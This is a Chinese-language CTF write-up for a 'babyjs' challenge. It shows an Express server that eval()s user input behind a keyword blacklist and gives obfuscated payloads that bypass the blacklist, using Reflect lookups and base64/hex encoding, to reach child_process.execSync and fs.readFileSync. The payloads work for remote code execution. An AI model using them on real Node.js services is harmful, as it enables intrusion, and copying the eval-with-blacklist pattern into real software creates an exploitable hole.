# babyjs

hint：https://www.anquanke.com/post/id/237032

首先访问`/source`然后点击图片，得到源码

```javascript
const express = require('express')
const bodyParser = require('body-parser')
const path = require('path');
const app = express()

function bypass(code) {
  const re = new RegExp(/exec|\\|cat|\+|`|eval|includes|Buffer|\[/i);
  return re.test(code);
}

app.use(bodyParser.urlencoded({ extended: true }))
app.use("/template",express.static(path.join(__dirname, '/template')))

app.get('/',function (req,res){
    res.send("访问/source得到源码,have fun!");
  }
)

app.get('/source', function(req, res) {
  res.sendFile(path.join(__dirname + '/template/source.html'));
});



app.post('/', function (req, res) {
  let code = req.body.code;
  if (bypass(code)) {
    res.send("简单的过滤，尝试绕过一下吧");
  } else {
    try{
      res.send(eval(code));
    }
    catch(e){
      res.send("error!");
    }
  }
})

app.listen(3000);
```



发现存在一个`res.send(eval(code))`，可以执行命令。但存在一个bypass函数对code进行过滤

过滤了：`exec、\、cat、+、反引号、eval、includes、Buffer、[`

推荐一个测试正则匹配的网站：https://hiregex.com/

## 解法一

`通过global全局对象加载模块`来调用子进程执行命令：

```javascript
global.process.mainModule.constructor._load('child_process').execSync('ls');
```

看懂文章就可以了，很简单，首先获取eval和Buffer，最后通过base64执行命令：

```javascript
eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJ3aG9hbWkiKQ==','base64').toString())
```

最后绕过过滤构造出来为

```javascript
//base64
Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith('eva')))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith('Buf')))),1)('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJ3aG9hbWkiKQ==','base64').toString())
//16进制
Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith('eva')))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith('Buf')))),1)('676c6f62616c2e70726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428226368696c645f70726f6365737322292e6578656353796e63282277686f616d692229','hex').toString())
```

这里其实可以直接使用Object.values：

```javascript
Reflect.get(Object.values(require('child_process')),8)('whoami')
Reflect.get(Object.values(global.process.mainModule.constructor._load('child_process')),8)('whoami')
```

也很巧妙的

## 解法二

可以直接使用fs模块读取文件，不要觉得只能用命令执行，要巧用其他的一些模块

```javascript
require('fs').readdirSync('./')
require('fs').readFileSync('flag')
```
